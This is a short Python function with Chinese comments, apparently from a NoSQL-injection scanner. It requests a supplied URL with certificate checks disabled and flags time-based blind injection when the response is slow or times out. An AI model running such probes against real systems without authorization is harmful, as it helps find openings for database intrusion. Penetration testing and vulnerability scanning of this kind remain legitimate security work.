
def test_time_injection(url):
    """
    測試基於時間的注入
    
    Args:
        url (str): 測試URL
    """
    try:
        print(f"[*] 測試時間盲注URL: {url}")
        start_time = time.time()
        response = requests.get(url, timeout=10, verify=False)  # 增加超時時間
        end_time = time.time()
        
        elapsed_time = end_time - start_time
        
        print(f"[+] 響應時間: {elapsed_time:.4f}秒")
        
        # 檢查響應時間
        if elapsed_time > 2.0:  # 如果響應時間超過2秒
            print("[!] " + get_message('NOSQLI_FOUND') + " " + get_message('TIME_VARIANCE_SUCCESS').format(delta=elapsed_time))
        else:
            print(get_message('TIME_VARIANCE_FAIL').format(delta=elapsed_time))
            
    except requests.exceptions.Timeout:
        print("[!] " + get_message('NOSQLI_FOUND') + " 請求超時，可能存在時間盲注")
    except Exception as e:
        print(f"[!] 測試時間盲注時出錯: {str(e)}") 